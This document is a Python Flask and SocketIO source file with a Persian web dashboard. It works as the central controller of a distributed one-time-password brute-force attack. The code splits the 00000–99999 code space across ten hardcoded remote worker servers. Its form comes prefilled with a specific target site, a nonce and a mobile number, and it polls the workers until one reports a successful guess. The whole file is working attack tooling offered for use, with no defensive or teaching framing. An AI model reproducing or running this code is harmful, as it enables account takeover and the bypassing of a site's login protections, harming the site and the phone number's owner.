import requests
from flask import Flask, render_template_string, request
from flask_socketio import SocketIO, emit
import threading
import time

app = Flask(__name__)
socketio = SocketIO(app)

REMOTE_SERVERS = [
    "http://63.142.254.127:5000",
    "http://63.142.246.30:5000",
    "http://185.189.27.75:5000",
    "http://185.189.27.62:5000",
    "http://185.185.126.164:5000",
    "http://104.251.211.205:5000",
    "http://185.189.27.11:5000",
    "http://185.183.182.217:5000",
    "http://185.183.182.137:5000",
    "http://104.251.219.67:5000",
]

RANGES = [
    (0, 10000),
    (10000, 20000),
    (20000, 30000),
    (30000, 40000),
    (40000, 50000),
    (50000, 60000),
    (60000, 70000),
    (70000, 80000),
    (80000, 90000),
    (90000, 99999),
]

progress_log = []
found_success = False
monitoring = False

def send_to_remote(server_url, host, nonce, mobile, connections, start_range, end_range):
    """ارسال درخواست به سرور ریموت"""
    try:
        response = requests.post(
            f"{server_url}/start",
            json={"host": host, "nonce": nonce, "mobile": mobile, "connections": connections, "startRange": start_range, "endRange": end_range},
            timeout=10
        )
        response.raise_for_status()
        progress_log.append(f"Request sent to {server_url} for range {start_range}-{end_range}")
        socketio.emit('update_progress', {'log': progress_log[-1]})
    except requests.exceptions.RequestException as e:
        progress_log.append(f"Failed to send request to {server_url}: {str(e)}")
        socketio.emit('update_progress', {'log': progress_log[-1]})

def stop_all_servers():
    """توقف همه سرورها"""
    for server in REMOTE_SERVERS:
        try:
            requests.post(f"{server}/stop", timeout=5)
            progress_log.append(f"Stop request sent to {server}")
            socketio.emit('update_progress', {'log': progress_log[-1]})
        except requests.exceptions.RequestException as e:
            progress_log.append(f"Failed to stop {server}: {str(e)}")
            socketio.emit('update_progress', {'log': progress_log[-1]})

def monitor_status():
    """مانیتور کردن وضعیت ورکرها هر 5 ثانیه و ارسال به کلاینت"""
    global monitoring, found_success
    while monitoring:
        status_data = {}
        for server in REMOTE_SERVERS:
            try:
                response = requests.get(f"{server}/status", timeout=5)
                response.raise_for_status()
                status = response.json()
                status_data[server] = {
                    "running": status["running"],
                    "current_range": status["current_range"],
                    "processed": status["processed"],
                    "error": status["error"]
                }
                if status["error"] and "Success found!" in status["error"]:
                    found_success = True
                    progress_log.append("Success found on a remote server! Stopping all servers...")
                    socketio.emit('update_progress', {'log': progress_log[-1]})
                    stop_all_servers()
                    monitoring = False
                    break
            except requests.exceptions.RequestException as e:
                status_data[server] = {
                    "running": False,
                    "current_range": {"start": "-", "end": "-"},
                    "processed": "-",
                    "error": f"Failed to connect: {str(e)}"
                }
        socketio.emit('update_table', status_data)
        time.sleep(5)

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="fa">
    <head>
        <meta charset="UTF-8">
        <title>بررسی کد OTP - سرور مرکزی</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.1/socket.io.js"></script>
        <style>
            body { direction: rtl; font-family: Arial, sans-serif; }
            .container { max-width: 1200px; margin: 0 auto; }
            #progress-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            #progress-table th, #progress-table td { border: 1px solid #ddd; padding: 12px; text-align: center; }
            #progress-table th { background-color: #f2f2f2; font-weight: bold; }
            #progress-table tr:nth-child(even) { background-color: #f9f9f9; }
            #progress-table tr:hover { background-color: #f1f1f1; }
            .status-active { color: green; font-weight: bold; }
            .status-inactive { color: red; font-weight: bold; }
            .error-cell { color: #d9534f; max-width: 300px; word-wrap: break-word; }
        </style>
    </head>
    <body class="bg-gray-100 p-8">
        <div class="container">
            <div class="bg-white p-8 rounded-lg shadow-lg">
                <h1 class="text-3xl font-bold text-center mb-8">بررسی کد OTP - سرور مرکزی</h1>
                <form id="form" class="space-y-6">
                    <div>
                        <label class="block text-sm font-medium text-gray-700">هاست:</label>
                        <input type="text" id="host" class="mt-1 block w-full p-3 border rounded-lg" value="www.arzanpanel-iran.com">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Nonce:</label>
                        <input type="text" id="nonce" class="mt-1 block w-full p-3 border rounded-lg" value="9d6178e07d">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">شماره موبایل:</label>
                        <input type="text" id="mobile" class="mt-1 block w-full p-3 border rounded-lg" value="09039495749">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">تعداد کانکشن‌ها:</label>
                        <input type="number" id="connections" class="mt-1 block w-full p-3 border rounded-lg" value="20">
                    </div>
                    <div class="flex space-x-6">
                        <button type="button" id="start" class="w-full bg-green-500 text-white p-3 rounded-lg hover:bg-green-600">شروع</button>
                        <button type="button" id="stop" class="w-full bg-red-500 text-white p-3 rounded-lg hover:bg-red-600" disabled>توقف</button>
                    </div>
                </form>
                <div class="mt-8">
                    <h2 class="text-xl font-semibold text-center mb-4">وضعیت سرورها</h2>
                    <table id="progress-table">
                        <thead>
                            <tr>
                                <th>سرور</th>
                                <th>وضعیت</th>
                                <th>رنج فعلی</th>
                                <th>تعداد پردازش‌شده</th>
                                <th>خطا</th>
                            </tr>
                        </thead>
                        <tbody id="table-body">
                            <!-- جدول با WebSocket پر می‌شه -->
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <script>
            const socket = io();
            const form = document.getElementById('form');
            const startBtn = document.getElementById('start');
            const stopBtn = document.getElementById('stop');
            const tableBody = document.getElementById('table-body');

            // لیست سرورها
            const servers = [
                "http://63.142.254.127:5000",
                "http://63.142.246.30:5000",
                "http://185.189.27.75:5000",
                "http://185.189.27.62:5000",
                "http://185.185.126.164:5000",
                "http://104.251.211.205:5000",
                "http://185.189.27.11:5000",
                "http://185.183.182.217:5000",
                "http://185.183.182.137:5000",
                "http://104.251.219.67:5000"
            ];

            socket.on('connect', () => {
                console.log('Connected to WebSocket');
            });

            socket.on('update_table', (data) => {
                tableBody.innerHTML = ''; // پاک کردن جدول قبلی
                servers.forEach(server => {
                    const status = data[server] || {
                        running: false,
                        current_range: { start: '-', end: '-' },
                        processed: '-',
                        error: 'No data available'
                    };
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${server}</td>
                        <td class="${status.running ? 'status-active' : 'status-inactive'}">
                            ${status.running ? 'فعال' : 'غیرفعال'}
                        </td>
                        <td>${status.current_range.start} - ${status.current_range.end}</td>
                        <td>${status.processed} / ${status.current_range.end}</td>
                        <td class="error-cell">${status.error || '-'}</td>
                    `;
                    tableBody.appendChild(row);
                });
            });

            socket.on('update_progress', (data) => {
                console.log('Log:', data.log);
            });

            startBtn.addEventListener('click', () => {
                const host = document.getElementById('host').value;
                const nonce = document.getElementById('nonce').value;
                const mobile = document.getElementById('mobile').value;
                const connections = document.getElementById('connections').value;

                fetch('/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ host, nonce, mobile, connections })
                }).then(response => {
                    if (response.ok) {
                        startBtn.disabled = true;
                        stopBtn.disabled = false;
                    } else {
                        console.error('Start failed:', response.status);
                    }
                }).catch(error => console.error('Fetch error:', error));
            });

            stopBtn.addEventListener('click', () => {
                fetch('/stop', {
                    method: 'POST'
                }).then(() => {
                    startBtn.disabled = false;
                    stopBtn.disabled = true;
                });
            });
        </script>
    </body>
    </html>
    ''')

@app.route('/start', methods=['POST'])
def start():
    global progress_log, found_success, monitoring
    data = request.get_json()
    host = data['host']
    nonce = data['nonce']
    mobile = data['mobile']
    connections = int(data['connections'])

    found_success = False
    progress_log = []
    monitoring = True
    progress_log.append("Starting distribution to remote servers...")
    socketio.emit('update_progress', {'log': progress_log[-1]})

    threads = []
    for i, server in enumerate(REMOTE_SERVERS):
        start_range, end_range = RANGES[i]
        thread = threading.Thread(target=send_to_remote, args=(server, host, nonce, mobile, connections, start_range, end_range))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    # شروع مانیتورینگ وضعیت
    threading.Thread(target=monitor_status, daemon=True).start()

    return '', 204

@app.route('/stop', methods=['POST'])
def stop():
    global progress_log, monitoring
    monitoring = False
    stop_all_servers()
    return '', 204

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
